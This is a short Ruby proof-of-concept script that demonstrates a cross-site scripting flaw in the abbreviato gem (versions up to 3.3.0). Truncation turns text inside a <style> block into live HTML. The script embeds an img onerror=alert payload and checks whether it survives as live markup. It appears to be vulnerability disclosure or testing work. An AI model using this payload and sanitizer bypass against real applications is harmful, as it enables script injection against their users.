#!/usr/bin/env ruby
# PoC: abbreviato <= 3.3.0 -- CDATA/comment content escapes a dropped element
#      unescaped, promoting inert <style> text into live HTML markup.
#
# Usage: gem install abbreviato activesupport && ruby abbreviato_cdata_escape.rb

# activesupport is an undeclared dependency of abbreviato (it calls String#blank?),
# so require it explicitly to make this PoC self-contained.
require "active_support/core_ext/object/blank"
require "abbreviato"
require "nokogiri"

# A <style> block whose CSS text happens to contain angle brackets.
# Inside <style>, this is CDATA -- it is TEXT, not markup. An HTML sanitizer
# that permits <style> (common for email rendering) correctly leaves it alone.
PAD   = "padding-" * 8
INERT = '<div class="' + PAD + '"><style>.a{color:red}' \
        '<img src=x onerror=alert(document.domain)></style></div>'

puts "abbreviato version: " + Abbreviato::VERSION
puts
puts "== INPUT (the <img> is CSS text inside <style>; inert) =="
puts INERT
puts
puts "   live <img> elements when input is parsed as HTML: " +
     Nokogiri::HTML.fragment(INERT).css("img").length.to_s
puts

out, truncated = Abbreviato.truncate(INERT, max_length: 60, tail: "")

puts "== OUTPUT of Abbreviato.truncate(max_length: 60) =="
puts out
puts
live = Nokogiri::HTML.fragment(out).css("img[onerror]")
puts "   live <img onerror> elements in output: " + live.length.to_s
puts "   <style> wrapper still present:         " + out.include?("<style").to_s
puts "   truncated flag:                        " + truncated.to_s
puts

if live.length.positive? && !out.include?("<style")
  puts "RESULT: VULNERABLE -- inert CSS text was emitted as live HTML."
else
  puts "RESULT: not reproduced on this version."
end
